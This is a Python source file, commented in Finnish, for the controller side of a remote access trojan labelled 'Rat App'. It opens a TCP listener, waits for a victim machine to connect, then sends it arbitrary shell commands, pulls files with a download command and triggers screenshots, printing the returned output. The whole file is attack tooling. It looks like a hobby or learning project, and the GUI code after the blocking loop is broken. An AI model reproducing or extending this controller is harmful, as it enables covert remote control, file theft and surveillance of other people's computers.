import tkinter as tk
from tkinter import ttk
from tkinter.messagebox import showinfo
import socket
from commands import Commands


class MainServer(tk.Tk):
    def __init__(self, ip:str, port:int):
        super().__init__()
        self.ip = ip
        self.port = port
        self.command = Commands()
        #luodaan uusi socket objekti käyttämällä socket-funktiota
        # #af_inet == ipv4, sock_stream == tcp-yhteys
        # #bindataan ip & portti -> listen == maksimiyhteydet
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((self.ip, self.port))
        self.s.listen(1)
        print('[+] Waiting for connection...\n')
        self.client, self.client_addr = self.s.accept()
        #accept metodi palauttaa -> target == itse yhteys kohteeseen
        # # target_addr == tuple jossa index0 :ssa targetin ip ja index1:ssa väliaikaisportti
        print(f'[+] New connection from {self.client_addr[0]}')


        # configure the root window
        self.title('Rat App')
        self.geometry('300x100+500+500')

        # label
        self.label = ttk.Label(self, text='Want to take a screenshot?')
        self.label.pack()

        # button
        self.button = ttk.Button(self, text='Take the shot!', command=self.command.button_clicked)
        #self.button['command'] = self.button_clicked
        self.button.pack(padx=20, pady=20)
        
       
        while True:
            #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
            command = input('>> ').encode()
            if command == b'exit':      #byteinä koska muutettiin se edellisellä rivillä
                self.client.send(command)    #vaikka lopetetaan niin kuitenkin tieto kohteeseen
                self.client.close()
                self.s.close()
                break
            elif command == b'':
                continue
            elif command == b'cls':
                self.command.clear_screen()
            elif command.startswith(b'download'):
                self.client.send(command)
                self.command.download(self.client,command)
                # elif command.startswith(b'upload'):
                #     upload(target,command)
                #      continue
            elif command == b'screen':
                print('Taking screenshot')
                self.client.send(command)
            else:
                self.client.send(command)
                #4kilotavua (pitäisi riittää) dataa back & decodataan bytet stringeiksi
                result = self.client.recv(4096).decode('ISO-8859-1')
                print(result)

    

    
    


if __name__ == "__main__":
    app = MainServer('172.20.16.62', 8888)
    app.mainloop()

